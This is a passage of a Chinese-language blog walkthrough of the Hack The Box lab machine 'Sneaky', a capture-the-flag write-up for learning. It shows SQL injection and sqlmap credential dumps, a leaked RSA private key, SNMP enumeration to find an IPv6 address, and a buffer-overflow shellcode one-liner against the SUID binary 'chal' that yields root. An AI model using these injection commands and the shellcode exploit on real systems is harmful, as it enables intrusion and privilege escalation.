class="line">OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD</span><br><span class="line">OS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE</span><br><span class="line">OS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   228.00 ms 10.10.16.1</span><br><span class="line">2   296.00 ms 10.10.10.20</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 523.52 seconds</span><br></pre></td></tr></table></figure>
+<p>访问80端口的站点：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319103046.png" alt=""></p>
+<p>是一个静态页面，用dirsearch扫描一下站点目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;10.10.10.20&#x2F;</span><br><span class="line"></span><br><span class="line">[22:26:48] Starting: </span><br><span class="line">[22:26:55] 403 -  289B  - &#x2F;.ht_wsr.txt</span><br><span class="line">[22:26:55] 403 -  282B  - &#x2F;.hta</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-local</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-marco</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess-dev</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.BAK</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.bak1</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.old</span><br><span class="line">[22:26:55] 403 -  294B  - &#x2F;.htaccess.sample</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.orig</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.txt</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.save</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess_extra</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess_orig</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessBAK</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccess_sc</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessOLD</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htaccess~</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccessOLD2</span><br><span class="line">[22:26:55] 403 -  286B  - &#x2F;.htgroup</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htpasswd-old</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htpasswd_test</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htpasswds</span><br><span class="line">[22:26:56] 403 -  286B  - &#x2F;.htusers</span><br><span class="line">[22:28:10] 301 -  307B  - &#x2F;dev  -&gt;  http:&#x2F;&#x2F;10.10.10.20&#x2F;dev&#x2F;</span><br><span class="line">[22:28:10] 200 -  464B  - &#x2F;dev&#x2F;</span><br><span class="line">[22:28:30] 200 -  183B  - &#x2F;index.html</span><br><span class="line">[22:29:14] 403 -  291B  - &#x2F;server-status</span><br><span class="line">[22:29:14] 403 -  292B  - &#x2F;server-status&#x2F;</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>发现了一个dev路径，是一个后台登录页面，用万能密码注入试一下：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319104954.png" alt=""></p>
+<p>成功登录：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319105024.png" alt=""></p>
+<p>有一个admin用户，还有一个SSH key，但是没有端口登录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5</span><br><span class="line">Lc4V+rY81lS4cWUx&#x2F;EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr</span><br><span class="line">3mi0MyfiGRh&#x2F;Xr4L0+SwYdylkuX72E7rLkkigSt4s&#x2F;zXp5dJmL2RBZDJf1Qh6Ugb</span><br><span class="line">yDxG2ER49&#x2F;wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn</span><br><span class="line">cb+zfPcTvcP0t63kdEreQbdASYK6&#x2F;e7Iih&#x2F;5eBy3i8YoNJd6Wr8&#x2F;qVtmB+FuxcFj</span><br><span class="line">oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa</span><br><span class="line">Nyp&#x2F;9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR</span><br><span class="line">h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G&#x2F;8U&#x2F;lcx1tiWfUNkLdC</span><br><span class="line">CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX&#x2F;cUcblPDdOmxvazpnP4PW1rEpW8cT</span><br><span class="line">OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a</span><br><span class="line">I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB</span><br><span class="line">JkQxeUkCgYEA3RBR&#x2F;0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz</span><br><span class="line">5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY</span><br><span class="line">ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt&#x2F;MmoSaASbqpwhPSUCgYEA2uym</span><br><span class="line">+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu</span><br><span class="line">7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC</span><br><span class="line">GR4wYcZF0iH&#x2F;t4tn02qqOPaRGJAB3BD&#x2F;B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne</span><br><span class="line">aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q&#x2F;tv7E3kT195MuS10J</span><br><span class="line">VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x</span><br><span class="line">hxNWWZcUFcRuxp5ogcvBdQKBgQDB&#x2F;AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd</span><br><span class="line">1&#x2F;iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi&#x2F;93oJa1on&#x2F;QJlvbv4GO9y3LZ</span><br><span class="line">LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG</span><br><span class="line">UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k&#x2F;</span><br><span class="line">Hu+up36u92YlaT7Yk+fsk&#x2F;k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31</span><br><span class="line">rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>用BurpSuite把请求数据包保存成<code>sneaky.req</code>文件，再用sqlmap跑一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dbs</span><br><span class="line">...</span><br><span class="line">[00:33:32] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] dev</span><br><span class="line">[*] information_schema             </span><br><span class="line">[*] mysql                </span><br><span class="line">[*] performance_schema</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; --tables</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; --columns</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; -C &#39;name, pass&#39; --dump</span><br><span class="line">[00:38:48] [INFO] fetching entries of column(s) &#39;&#96;name&#96;, pass&#39; for table &#39;users&#39; in database &#39;dev&#39;</span><br><span class="line">Database: dev</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| name         | pass                 |</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| admin        | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">| thrasivoulos | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">+--------------+----------------------+</span><br></pre></td></tr></table></figure>
+<p>扫出了两个用户，没啥思路了，看一下writeup提示，好吧，还要扫描UDP端口，161端口上运行snmp服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE         SERVICE        VERSION</span><br><span class="line">161&#x2F;udp   open          snmp           SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">| snmp-info:</span><br><span class="line">|   enterprise: net-snmp</span><br><span class="line">|   engineIDFormat: unknown</span><br><span class="line">|   engineIDData: fcf2da02d0831859</span><br><span class="line">|   snmpEngineBoots: 8</span><br><span class="line">|_  snmpEngineTime: 6h24m47s</span><br><span class="line">| snmp-interfaces:</span><br><span class="line">|   lo</span><br><span class="line">|     IP address: 127.0.0.1  Netmask: 255.0.0.0</span><br><span class="line">|     Type: softwareLoopback  Speed: 10 Mbps</span><br><span class="line">|     Traffic stats: 9.74 Kb sent, 9.74 Kb received</span><br><span class="line">|   eth0</span><br><span class="line">|     IP address: 10.10.10.20  Netmask: 255.255.255.0</span><br><span class="line">|     MAC address: 00:50:56:b9:37:ed (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 4 Gbps</span><br><span class="line">|_    Traffic stats: 7.92 Mb sent, 7.47 Mb received</span><br><span class="line">| snmp-netstat:</span><br><span class="line">|   TCP  127.0.0.1:3306       0.0.0.0:0</span><br><span class="line">|_  UDP  0.0.0.0:161          *:*</span><br></pre></td></tr></table></figure>
+<p>既然IPv4的防火墙没有开放22端口，换个思路看一下IPv6的端口开放情况，前提就是我们知道靶机的IPv6本地唯一地址（类似IPv6的内网/私网地址），这里就要利用SNMP服务。</p>
+<p>使用snmpwalk工具扫描靶机上的设备：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v2c -c public 10.10.10.20 &gt; sneakly.snmp</span><br></pre></td></tr></table></figure>
+<p>打开文件之后直接全局搜索<code>10.10.10.20</code>：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321122646.png" alt=""></p>
+<p>我们就能找到靶机的IPv6地址(十进制表示)</p>
+<blockquote>
+<p>iso.3.6.1.2.1.4.34.1.4.2.16. 设备的OID号</p>
+</blockquote>
+<p>转换成十六进制表示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dead:beef::0250:56ff:feb9:2771</span><br></pre></td></tr></table></figure>
+<p>当然，我一开始打开这个文件也是一脸懵逼的状态，完全不知道输出的是什么意思，我们可以适当的让snmpwalk输出的内容更加可读：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装软件</span><br><span class="line">sudo apt-get install snmp-mibs-downloader</span><br><span class="line"></span><br><span class="line"># 编辑文件，注释掉mibs:这一行</span><br><span class="line">vim &#x2F;etc&#x2F;snmp&#x2F;snmp.conf</span><br></pre></td></tr></table></figure>
+<p>我们再执行snmpwalk命令，这一次可以再加一个OID参数减少输出的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.4.2.16</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br></pre></td></tr></table></figure>
+<p>整理一下和刚刚得到的地址是一样的。</p>
+<p>除此之外，还可以使用靶机作者写的一个Python脚本得到靶机的IPv6地址，<a target="_blank" rel="noopener" href="https://github.com/trickster0/Enyx">传送门</a>🚪</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321141207.png" alt=""></p>
+<blockquote>
+<p>注意，要把/etc/snmp/snmp.conf文件改回来，不然会运行报错</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -A -6 dead:beef::0250:56ff:feaa:0b69</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-07-30 22:11 IST</span><br><span class="line">Nmap scan report for dead:beef::250:56ff:feaa:b69</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)</span><br><span class="line">|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)</span><br><span class="line">|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)</span><br><span class="line">|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (EdDSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| address-info: </span><br><span class="line">|   IPv6 EUI-64: </span><br><span class="line">|     MAC address: </span><br><span class="line">|       address: 00:50:56:aa:0b:69</span><br><span class="line">|_      manuf: VMware</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds</span><br></pre></td></tr></table></figure>
+<p>再用之前得到的SSH key登录靶机，拿到user.txt：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">λ ssh -6 -i sneaky.key thrasivoulos@dead:beef::0250:56ff:feb9:2771</span><br><span class="line">The authenticity of host &#39;dead:beef::250:56ff:feb9:2771 (dead:beef::250:56ff:feb9:2771)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq&#x2F;E2o.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)? yes</span><br><span class="line">Warning: Permanently added &#39;dead:beef::250:56ff:feb9:2771&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-75-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com&#x2F;</span><br><span class="line"></span><br><span class="line">  System information as of Fri Mar 20 08:31:46 EET 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           160</span><br><span class="line">  Usage of &#x2F;:   9.9% of 18.58GB   Users logged in:     0</span><br><span class="line">  Memory usage: 10%               IP address for eth0: 10.10.10.20</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https:&#x2F;&#x2F;landscape.canonical.com&#x2F;</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2019.</span><br><span class="line">Last login: Fri Mar 20 08:31:47 2020 from dead:beef:4::1057</span><br><span class="line">thrasivoulos@Sneaky:~$ ls</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
+<p>检查suid文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null;</span><br><span class="line">-rwsr-xr-x 1 root root 67704 Nov 24  2016 &#x2F;bin&#x2F;umount</span><br><span class="line">-rwsr-xr-x 1 root root 35300 May  4  2017 &#x2F;bin&#x2F;su</span><br><span class="line">-rwsr-xr-x 1 root root 88752 Nov 24  2016 &#x2F;bin&#x2F;mount</span><br><span class="line">-rwsr-xr-x 1 root root 43316 May  8  2014 &#x2F;bin&#x2F;ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30112 May 15  2015 &#x2F;bin&#x2F;fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 38932 May  8  2014 &#x2F;bin&#x2F;ping</span><br><span class="line">-rwsrwsr-x 1 root root 7301 May  4  2017 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">-rwsr-xr-- 1 root dip 323000 Apr 21  2015 &#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">-rwsr-xr-x 1 root root 18168 Nov 24  2015 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 18136 May  8  2014 &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">-rwsr-xr-x 1 root root 35916 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">-rwsr-xr-x 1 root root 66284 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 45420 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">-rwsr-xr-x 1 root root 72860 Oct 21  2013 &#x2F;usr&#x2F;bin&#x2F;mtr</span><br><span class="line">-rwsr-xr-x 1 root root 30984 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 156708 Oct 14  2016 &#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">-rwsr-xr-x 1 root root 44620 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 492972 Aug 11  2016 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 9808 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-x 1 root root 5480 Mar 27  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>命令解释：</p>
+<p>-perm -4000 列出拥有setuid属性的文件和目录</p>
+<p>-user root 文件或目录所有者属于root</p>
+<p>-exec ls -ld {} \ 对之前列出的文件目录再执行<code>ls -ld</code>命令</p>
+<p>2&gt;/dev/null 将标准错误输出stderr删掉</p>
+</blockquote>
+<p>查看<code>/usr/local/bin/chal</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ file &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped</span><br></pre></td></tr></table></figure>
+<p>好了，从这里开始就到了我的知识盲区了，涉及到栈溢出漏洞的利用，只能跟着大佬一步一步的来。</p>
+<p>Shellcode：<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">thrasivoulos@Sneaky:&#x2F;usr&#x2F;local&#x2F;bin$ .&#x2F;chal $(python -c &#39;print &quot;\x90&quot;*330 +&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot; + &quot;\x42\xf4\xff\xbf&quot;*30&#39;)</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;1000(thrasivoulos) gid&#x3D;1000(thrasivoulos) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">c515[----------------------------]fb33</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Summary">0x05 Summary</h2>
+<p>Sneaky是一个2017年的靶机，评分5分，不得不说质量非常高。扫描常规的TCP端口和网站路径后，用基本的SQL注入拿到用户名和SSH key，但是现在遇到了没有开放22端口的问题，紧接着去扫描UDP端口，发现运行了SNMP服务，我们可以使用snmpwalk工具通过GETNEXT请求查询指定OID入口的所有OID树信息，由此获得了靶机了IPv6的地址，nmap扫描后发现开放了SSH 22端口。但是提权root用到了栈溢出的知识点，确实没什么基础，看起来有点吃力，先mark，下次有时间再研究一下。</p>
+<h2 id="0x06-Reference">0x06 Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be">https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be</a></p>
+<p><a target="_blank" rel="noopener" href="https://s1gh.sh/hackthebox-sneaky-walkthrough/">https://s1gh.sh/hackthebox-sneaky-walkthrough/</a></p>
+<p><a target="_blank" rel="noopener" href="https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/">https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/">https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
